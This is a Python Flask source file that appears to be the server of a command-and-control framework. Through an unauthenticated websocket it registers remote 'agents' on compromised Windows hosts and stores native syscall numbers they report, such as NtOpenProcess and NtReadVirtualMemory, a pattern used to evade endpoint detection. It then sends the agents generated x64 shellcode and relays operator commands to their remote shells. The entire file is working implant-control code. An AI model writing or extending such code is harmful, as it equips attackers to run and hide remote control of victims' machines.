from flask import request, jsonify, Blueprint, current_app, g, url_for
from flask_jwt_extended import create_access_token,create_refresh_token, jwt_required, get_jwt_identity, get_jwt
from utils import sanitize_username, check_password_complexity
from flask_jwt_extended.utils import decode_token
from app import anon_bp
from flask_jwt_extended.exceptions import JWTExtendedException
from routes.auth.sudo.system import sock
from models.agent import Agent
from models.shell import Shell
from models.line import Line
from models.syscall import Syscall
from services.binary import generate_x64_push_syscall
import logging
logger = logging.getLogger(__name__)

bp = Blueprint("agent", __name__, url_prefix='/agent')

from flask import request, current_app
import threading
import time

def save_syscalls_bytes(agent_id, data: bytes):
    """
    Takes a string in the format:
        APINAME:SyscallNumber,APINAME:SyscallNumber,...

    Example:
        NtOpenProcess:38,NtClose:15,NtReadVirtualMemory:63
    """
    if not data:
        raise ValueError("Input string is empty")
    value = data.decode()
    created = []

    for item in value.split(","):
        item = item.strip()
        if not item:
            continue

        if ":" not in item:
            raise ValueError(f"Invalid entry: {item}")

        name, syscall_str = item.split(":", 1)
        name = name.strip()
        syscall_str = syscall_str.strip()

        if not name:
            raise ValueError(f"Missing API name in entry: {item}")

        try:
            syscall_number = int(syscall_str)
        except ValueError:
            raise ValueError(f"Invalid syscall number in entry: {item}")

        syscall_obj = Syscall(agent_id, name, syscall_number)
        syscall_obj.save()

    return created

@sock.route(f"{anon_bp.url_prefix}{bp.url_prefix}/ws/<agent_id>")
def server_agent_ws(ws, agent_id):
    print("Starting shell...")

    try:
        msg = ws.receive(timeout=5)
        ip = request.remote_addr

        if msg is None:
            raise ValueError("empty handshake")

        # Normalize handshake to bytes
        if isinstance(msg, str):
            msg = msg.encode("utf-8")

        if not isinstance(msg, (bytes, bytearray)):
            raise TypeError(f"unexpected handshake type: {type(msg)!r}")

        msg = bytes(msg)

        # Handshake format:
        # [0:36]   -> shell_id (ascii/utf-8)
        # [36:pos] -> os (ascii/utf-8)
        # [pos+1:] -> raw syscall blob
        shell_id_bytes = msg[:36]
        pos = msg.find(b";", 36)
        if pos == -1:
            raise ValueError("invalid handshake: missing separator")

        os_bytes = msg[36:pos]
        syscall_blob = msg[pos + 1:]

        shell_id = shell_id_bytes.decode("utf-8", errors="strict")
        os_name = os_bytes.decode("utf-8", errors="replace")

        print(f"Creating agent with id {agent_id} and os {os_name}")
        new_agent = Agent(agent_id, ip, os_name, "admin")
        new_agent.save()

        new_shell = Shell(shell_id, agent_id)
        print(f"Creating shell with id {shell_id}")
        new_shell.save()

        # This function should accept bytes now
        save_syscalls_bytes(agent_id, syscall_blob)

        sys_number = Syscall.sys(agent_id, "ZwClose")
        shellcode = generate_x64_push_syscall(sys_number, [0])

        # Ensure binary websocket frame
        ws.send(shellcode)

    except Exception:
        logger.info("No handshake received.", exc_info=True)
        ws.send(b"[auth] no handshake received\n")
        ws.close()
        return

    app = current_app._get_current_object()
    stop_event = threading.Event()

    def poll_outgoing():
        last_sent_id = 0

        with app.app_context():
            while not stop_event.is_set():
                try:
                    lines = Line.by_shell_outgoing_after(shell_id, last_sent_id)

                    for line in lines:
                        last_sent_id = line.id

                        # Expect binary content in DB/model.
                        data = line.content
                        if isinstance(data, str):
                            data = data.encode("utf-8")
                        elif isinstance(data, bytearray):
                            data = bytes(data)

                        print(
                            f"Sending to agent {agent_id} and shell {shell_id}: "
                            f"{len(data)} bytes"
                        )

                        try:
                            ws.send(data)
                        except Exception:
                            stop_event.set()
                            break

                    time.sleep(1)

                except Exception:
                    logger.exception("Failed polling outgoing lines for shell %s", shell_id)
                    stop_event.set()

    poll_thread = threading.Thread(target=poll_outgoing, daemon=True)
    poll_thread.start()

    try:
        while not stop_event.is_set():
            try:
                message = ws.receive()
                print(f"Received message {message}")
            except Exception:
                logger.info("WebSocket receive failed/closed for shell %s", shell_id)
                break

            if message is None:
                logger.info("WebSocket closed for shell %s", shell_id)
                break

            # Normalize everything to bytes
            if isinstance(message, str):
                message = message.encode("utf-8")
            elif isinstance(message, bytearray):
                message = bytes(message)

            if not isinstance(message, bytes):
                logger.warning(
                    "Unexpected websocket message type for shell %s: %r",
                    shell_id,
                    type(message),
                )
                continue

            if not message:
                continue

            with app.app_context():
                print(
                    f"Received from agent {agent_id} and shell {shell_id}: "
                    f"{len(message)} bytes"
                )
                line = Line.create_for_shell(
                    shell_id=shell_id,
                    content=message,
                    incoming=True
                )
                line.save()

    finally:
        stop_event.set()
        new_shell.delete()
        try:
            ws.close()
        except Exception:
            pass